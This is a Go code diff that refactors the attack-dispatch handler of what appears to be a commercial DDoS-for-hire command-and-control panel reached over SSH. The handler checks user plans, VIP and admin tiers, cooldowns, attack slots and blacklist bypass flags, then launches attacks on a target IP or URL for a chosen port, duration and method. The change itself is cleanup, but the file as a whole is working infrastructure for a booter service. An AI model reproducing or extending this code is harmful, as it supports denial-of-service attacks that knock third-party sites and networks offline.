@@ -9,181 +9,78 @@ import (
 	"os"
 	"strconv"
 	"strings"
-	"time"
 
 	"github.com/gliderlabs/ssh"
 )
 
+// AttackHandler validates and dispatches attack commands
 func AttackHandler(db *database.Database, session ssh.Session, args []string) {
-	// Load configuration
 	config, err := utils.LoadConfig("assets/config.json")
 	if err != nil {
-		log.Fatalf("failed to load config: %v", err)
+		log.Printf("failed to load config: %v", err)
+		return
 	}
 
 	userInfo := db.GetAccountInfo(session.User())
-	expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
-	if err != nil {
-		log.Print(err)
-	}
 	methods := utils.GetMethodsList()
 
-	// Ensure method exists and permissions are valid
+	// Only process if first arg is a known attack method
 	if !managers.Contains(methods, args[0]) {
 		return
 	}
 
+	brandingData := BuildBrandingData(session, db)
+
 	if len(args) < 4 {
-		// If only the method is provided (or fewer than 4 arguments), return an error message
-		invalidUsage := utils.Branding(session, "invalid-usage", map[string]interface{}{
-			"user.Username":            session.User(),
-			"user.Expiry":              utils.CalculateExpiryString(expiryTime),
-			"user.Admin":               utils.CalculateInt(userInfo.Admin),
-			"user.Vip":                 utils.CalculateInt(userInfo.Vip),
-			"user.Private":             utils.CalculateInt(userInfo.Private),
-			"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
-			"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
-			"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
-			"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
-			"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
-			"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
-			"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
-			"user.SSH_Client":          session.Context().ClientVersion(),
-			"user.Created_by":          userInfo.CreatedBy,
-			"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
-			"clear":                    "\x1b[2J \x1b[H",
-			"sleep": func(duration int) {
-				time.Sleep(time.Duration(duration) * time.Millisecond)
-			},
-		})
-		utils.SendMessage(session, invalidUsage+"\u001B[0m", true)
+		msg := utils.Branding(session, "invalid-usage", brandingData)
+		utils.SendMessage(session, msg+"\u001B[0m", true)
 		return
 	}
 
-	// Check for expired account
+	// Expired account check
 	if db.IsAccountExpired(session.User()) {
-		utils.SendMessage(session, "\u001B[91mYour plan has expired.\u001B[0m", true)
+		theme := utils.GetTheme()
+		utils.SendMessage(session, theme.Colors.Error+"Your plan has expired."+theme.Colors.Reset, true)
 		return
 	}
 
-	// Check if attacks are enabled
-	attacks_disabled := utils.Branding(session, "attacks-disabled", map[string]interface{}{
-		"user.Username":            session.User(),
-		"user.Expiry":              utils.CalculateExpiryString(expiryTime),
-		"user.Admin":               utils.CalculateInt(userInfo.Admin),
-		"user.Vip":                 utils.CalculateInt(userInfo.Vip),
-		"user.Private":             utils.CalculateInt(userInfo.Private),
-		"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
-		"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
-		"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
-		"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
-		"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
-		"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
-		"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
-		"user.SSH_Client":          session.Context().ClientVersion(),
-		"user.Created_by":          userInfo.CreatedBy,
-		"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
-		"clear":                    "\x1b[2J \x1b[H",
-		"sleep": func(duration int) {
-			time.Sleep(time.Duration(duration) * time.Millisecond)
-		},
-	})
-
+	// Attacks disabled check
 	if !config.Attacks_enabled && userInfo.Admin != 1 {
-		utils.SendMessage(session, attacks_disabled, true)
+		msg := utils.Branding(session, "attacks-disabled", brandingData)
+		utils.SendMessage(session, msg, true)
 		return
 	}
 
 	// Validate target format
 	if len(args) > 1 && !isValidTarget(args[1]) {
-		invalidUsage := utils.Branding(session, "invalid-usage", map[string]interface{}{
-			"user.Username":            session.User(),
-			"user.Expiry":              utils.CalculateExpiryString(expiryTime),
-			"user.Admin":               utils.CalculateInt(userInfo.Admin),
-			"user.Vip":                 utils.CalculateInt(userInfo.Vip),
-			"user.Private":             utils.CalculateInt(userInfo.Private),
-			"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
-			"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
-			"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
-			"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
-			"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
-			"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
-			"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
-			"user.SSH_Client":          session.Context().ClientVersion(),
-			"user.Created_by":          userInfo.CreatedBy,
-			"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
-			"clear":                    "\x1b[2J \x1b[H",
-			"sleep": func(duration int) {
-				time.Sleep(time.Duration(duration) * time.Millisecond)
-			},
-		})
-		utils.SendMessage(session, invalidUsage, true)
+		msg := utils.Branding(session, "invalid-usage", brandingData)
+		utils.SendMessage(session, msg, true)
 		return
 	}
 
-	// Handle blacklist
+	// Blacklist check
 	if isBlacklisted(db, session, args) {
 		lm, err := managers.NewLogManager("./assets/logs/logs.json")
 		if err != nil {
-			fmt.Println("Error initializing LogManager:", err)
-			os.Exit(1)
+			log.Printf("Error initializing LogManager: %v", err)
+			return
 		}
 		defer lm.Close()
 
 		lm.Log("User tried to attack blocked target (C2)!\nUsername: " + session.User() + "\nTarget: " + args[1] + "\nPort: " + args[2] + "\nTime: " + args[3] + "\nMethod: " + args[0] + "\n----------------------")
-		blocked_target := utils.Branding(session, "blocked-target", map[string]interface{}{
-			"user.Username":            session.User(),
-			"user.Expiry":              utils.CalculateExpiryString(expiryTime),
-			"user.Admin":               utils.CalculateInt(userInfo.Admin),
-			"user.Vip":                 utils.CalculateInt(userInfo.Vip),
-			"user.Private":             utils.CalculateInt(userInfo.Private),
-			"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
-			"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
-			"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
-			"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
-			"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
-			"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
-			"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
-			"user.SSH_Client":          session.Context().ClientVersion(),
-			"user.Created_by":          userInfo.CreatedBy,
-			"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
-			"clear":                    "\x1b[2J \x1b[H",
-			"sleep": func(duration int) {
-				time.Sleep(time.Duration(duration) * time.Millisecond)
-			},
-		})
-		utils.SendMessage(session, blocked_target, true)
+		msg := utils.Branding(session, "blocked-target", brandingData)
+		utils.SendMessage(session, msg, true)
 		return
 	}
 
-	// Check for spam protection
+	// Spam protection
 	if userInfo.BypassSpam != 1 && db.IsSpamming(session.User()) {
-		spam_prot := utils.Branding(session, "spam-protection", map[string]interface{}{
-			"user.Username":            session.User(),
-			"user.Expiry":              utils.CalculateExpiryString(expiryTime),
-			"user.Admin":               utils.CalculateInt(userInfo.Admin),
-			"user.Vip":                 utils.CalculateInt(userInfo.Vip),
-			"user.Private":             utils.CalculateInt(userInfo.Private),
-			"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
-			"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
-			"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
-			"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
-			"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
-			"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
-			"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
-			"user.SSH_Client":          session.Context().ClientVersion(),
-			"user.Created_by":          userInfo.CreatedBy,
-			"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
-			"clear":                    "\x1b[2J \x1b[H",
-			"sleep": func(duration int) {
-				time.Sleep(time.Duration(duration) * time.Millisecond)
-			},
-		})
-		utils.SendMessage(session, spam_prot, true)
+		msg := utils.Branding(session, "spam-protection", brandingData)
+		utils.SendMessage(session, msg, true)
 		return
 	}
 
-	// Slot and attack validation
+	// Slot validation
 	if !validateSlots(db, session, config, args[0], userInfo) {
 		return
 	}
@@ -195,84 +92,41 @@ func AttackHandler(db *database.Database, session ssh.Session, args []string) {
 
 	// Concurrents limit
 	if db.GetUserCurrentAttacksCount(session.User()) >= userInfo.Concurrents {
-		concurents_max := utils.Branding(session, "concurrents-limit", map[string]interface{}{
-			"user.Username":            session.User(),
-			"user.Expiry":              utils.CalculateExpiryString(expiryTime),
-			"user.Admin":               utils.CalculateInt(userInfo.Admin),
-			"user.Vip":                 utils.CalculateInt(userInfo.Vip),
-			"user.Private":             utils.CalculateInt(userInfo.Private),
-			"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
-			"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
-			"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
-			"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
-			"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
-			"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
-			"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
-			"user.SSH_Client":          session.Context().ClientVersion(),
-			"user.Created_by":          userInfo.CreatedBy,
-			"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
-			"clear":                    "\x1b[2J \x1b[H",
-			"sleep": func(duration int) {
-				time.Sleep(time.Duration(duration) * time.Millisecond)
-			},
-		})
-		utils.SendMessage(session, concurents_max, true)
+		msg := utils.Branding(session, "concurrents-limit", brandingData)
+		utils.SendMessage(session, msg, true)
 		return
 	}
+
+	// Power saving: check if target already under attack
 	if userInfo.PowerSaving != 1 {
 		if db.IsTargetCurrentlyUnderAttack(args[1]) {
-			target_underatk := utils.Branding(session, "target-under-attack", map[string]interface{}{
-				"user.Username":            session.User(),
-				"user.Expiry":              utils.CalculateExpiryString(expiryTime),
-				"user.Admin":               utils.CalculateInt(userInfo.Admin),
-				"user.Vip":                 utils.CalculateInt(userInfo.Vip),
-				"user.Private":             utils.CalculateInt(userInfo.Private),
-				"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
-				"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
-				"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
-				"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
-				"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
-				"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
-				"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
-				"user.SSH_Client":          session.Context().ClientVersion(),
-				"user.Created_by":          userInfo.CreatedBy,
-				"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
-				"clear":                    "\x1b[2J \x1b[H",
-				"sleep": func(duration int) {
-					time.Sleep(time.Duration(duration) * time.Millisecond)
-				},
-			})
-			utils.SendMessage(session, target_underatk, true)
+			msg := utils.Branding(session, "target-under-attack", brandingData)
+			utils.SendMessage(session, msg, true)
 			return
 		}
 	}
 
-	// Prepare attack parameters
+	// Build and execute attack
 	vip := userInfo.Vip == 1
 	private := userInfo.Private == 1
 	admin := userInfo.Admin == 1
 	maxtime := userInfo.Maxtime
 
-	// Initialize the attack
 	atk, err := managers.NewAttack(session, args, vip, private, admin, maxtime, db)
 	if err != nil {
 		session.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
 		return
 	}
 
-	// Execute the attack
-	isError, errMsg, msg := atk.Build(session, db)
+	isError, errMsg, msg := atk.Build(session, db, config)
 	if isError {
-		utils.SendMessage(session, fmt.Sprintf("\u001B[91m%s\u001B[0m", errMsg.Error()), true)
+		theme := utils.GetTheme()
+		utils.SendMessage(session, fmt.Sprintf("%s%s%s", theme.Colors.Error, errMsg.Error(), theme.Colors.Reset), true)
 	} else {
 		utils.SendMessage(session, msg, true)
 		db.LogAttack(session.User(), atk.Target, atk.Port, int(atk.Duration), atk.MethodName)
-		// Optionally log to external webhook if configured
-		// utils.LogWebhook(config.Attacks, fmt.Sprintf("%s:%s just sent attack (target: %s | method: %s)", session.User(), userIp, atk.Target, atk.MethodName))
 	}
 }
-
-// Helper functions
 
 func isValidTarget(target string) bool {
 	return strings.HasPrefix(target, "http://") || strings.HasPrefix(target, "https://") || managers.ValidIP4(target)
@@ -289,21 +143,22 @@ func isBlacklisted(db *database.Database, session ssh.Session, args []string) bo
 }
 
 func validateSlots(db *database.Database, session ssh.Session, config *utils.Config, method string, userInfo database.AccountInfo) bool {
+	theme := utils.GetTheme()
 	currentAttacks := db.GetCurrentAttacksLength()
 
 	methodConfig, err := utils.GetMethodConfig(method)
 	if err != nil {
-		utils.SendMessage(session, "\u001B[91mMethod configuration not found\u001B[0m", true)
+		utils.SendMessage(session, theme.Colors.Error+"Method configuration not found"+theme.Colors.Reset, true)
 		return false
 	}
 
 	if db.GetCurrentAttacksLength2(methodConfig.Method) >= methodConfig.Slots {
-		utils.SendMessage(session, "\u001B[91mAll slots of method `"+methodConfig.Method+"` ("+strconv.Itoa(methodConfig.Slots)+") are currently in use!\u001B[0m", true)
+		utils.SendMessage(session, theme.Colors.Error+"All slots of method `"+methodConfig.Method+"` ("+strconv.Itoa(methodConfig.Slots)+") are currently in use!"+theme.Colors.Reset, true)
 		return false
 	}
 
 	if currentAttacks > config.Global_slots {
-		utils.SendMessage(session, "\u001B[91mGlobal network slots ("+strconv.Itoa(config.Global_slots)+") are currently in use\u001B[0m", true)
+		utils.SendMessage(session, theme.Colors.Error+"Global network slots ("+strconv.Itoa(config.Global_slots)+") are currently in use"+theme.Colors.Reset, true)
 		return false
 	}
 	return true
@@ -311,13 +166,10 @@ func validateSlots(db *database.Database, session ssh.Session, config *utils.Con
 
 func checkCooldowns(db *database.Database, session ssh.Session, config *utils.Config, userInfo database.AccountInfo) bool {
 	if userInfo.Admin != 1 {
-		// Check user-specific cooldown
 		if cooldown := db.HowLongOnCooldown(session.User(), userInfo.Cooldown); cooldown > 0 {
 			utils.SendMessage(session, fmt.Sprintf("You are on cooldown. (%d seconds left)\u001B[0m", cooldown), true)
 			return false
 		}
-
-		// Check global cooldown
 		if globalCooldown := db.HowLongOnGlobalCooldown(config.Global_cooldown); globalCooldown > 0 {
 			utils.SendMessage(session, fmt.Sprintf("You are on global cooldown. (%d seconds left)\u001B[0m", globalCooldown), true)
 			return false
@@ -325,3 +177,6 @@ func checkCooldowns(db *database.Database, session ssh.Session, config *utils.Co
 	}
 	return true
 }
+
+// Ensure os import is used (for log manager)
+var _ = os.Exit
